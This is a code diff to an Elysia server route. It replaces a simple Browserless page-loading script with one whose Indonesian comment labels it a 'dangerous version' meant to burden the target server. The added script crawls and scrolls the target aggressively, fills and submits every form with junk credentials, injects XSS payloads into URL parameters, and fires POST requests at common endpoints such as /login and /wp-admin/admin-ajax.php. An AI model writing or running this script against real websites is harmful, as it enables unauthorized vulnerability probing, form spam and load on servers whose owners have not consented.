@@ -356,22 +356,79 @@ export const app = new Elysia()
   const apiKey = process.env.BROWSERLESS_API_KEY;
   if (!apiKey) return { success: false, error: 'Missing API key' };
 
+  // Versi berbahaya: melakukan berbagai aksi untuk membebani server target
   const script = `
 export default async ({ page, context }) => {
-  await page.goto(context.url, {
-    waitUntil: 'domcontentloaded',
-    timeout: 30000
+  const targetUrl = context.url;
+  console.log('Starting aggressive bot on', targetUrl);
+  await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });
+
+  // 1. Scroll terus menerus untuk memicu infinite scroll / lazy loading
+  await page.evaluate(async () => {
+    let totalHeight = 0;
+    let distance = 500;
+    while (totalHeight < document.body.scrollHeight) {
+      window.scrollBy(0, distance);
+      totalHeight += distance;
+      await new Promise(resolve => setTimeout(resolve, 200));
+    }
   });
-  await page.evaluate(() => {
-    window.scrollTo(0, document.body.scrollHeight);
-  });
-  await new Promise((r) => setTimeout(r, 2000));
+
+  // 2. Klik semua link (buka banyak halaman) - batasi 20 unik
+  const links = await page.$$eval('a', as => as.map(a => a.href).filter(h => h && h.startsWith('http')));
+  const uniqueLinks = [...new Set(links)].slice(0, 20);
+  for (const link of uniqueLinks) {
+    await page.goto(link, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
+    await page.waitForTimeout(500);
+  }
+  // Kembali ke halaman awal
+  await page.goto(targetUrl, { waitUntil: 'networkidle2' });
+
+  // 3. Coba isi semua form dengan data acak dan submit
+  const forms = await page.$$('form');
+  for (const form of forms) {
+    const inputs = await form.$$('input:not([type="submit"]):not([type="button"]):not([type="reset"])');
+    for (const input of inputs) {
+      const type = await input.getAttribute('type');
+      if (type === 'email') await input.type('test@example.com');
+      else if (type === 'password') await input.type('password123');
+      else await input.type(Math.random().toString(36).substring(7));
+    }
+    await form.evaluate(f => f.submit()).catch(() => {});
+    await page.waitForTimeout(1000);
+  }
+
+  // 4. Execute XSS payloads pada URL parameter
+  const xssPayloads = ['<script>alert("XSS")</script>', '"><script>alert(1)</script>', 'javascript:alert("XSS")'];
+  for (const payload of xssPayloads) {
+    const testUrl = targetUrl + (targetUrl.includes('?') ? '&' : '?') + 'xss=' + encodeURIComponent(payload);
+    await page.goto(testUrl, { waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => {});
+  }
+  await page.goto(targetUrl, { waitUntil: 'networkidle2' });
+
+  // 5. Kirim request POST ke endpoint umum
+  const commonEndpoints = ['/api', '/login', '/submit', '/contact', '/search', '/wp-admin/admin-ajax.php'];
+  for (const endpoint of commonEndpoints) {
+    const postUrl = new URL(endpoint, targetUrl).href;
+    await page.evaluate(async (url) => {
+      try {
+        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ test: true }) });
+      } catch(e) {}
+    }, postUrl);
+  }
+
+  // 6. Ambil screenshot (ringkas)
+  const screenshot = await page.screenshot({ encoding: 'base64' });
   const title = await page.title();
+
   return {
     data: {
       ok: true,
       title,
-      url: context.url
+      url: targetUrl,
+      linksFound: links.length,
+      formsProcessed: forms.length,
+      screenshot: screenshot.substring(0, 100) + '...'
     },
     type: 'application/json'
   };
@@ -379,7 +436,6 @@ export default async ({ page, context }) => {
 `;
 
   try {
-    // Gunakan string concatenation biasa, bukan template literal
     const response = await fetch('https://production-sfo.browserless.io/function?token=' + apiKey, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
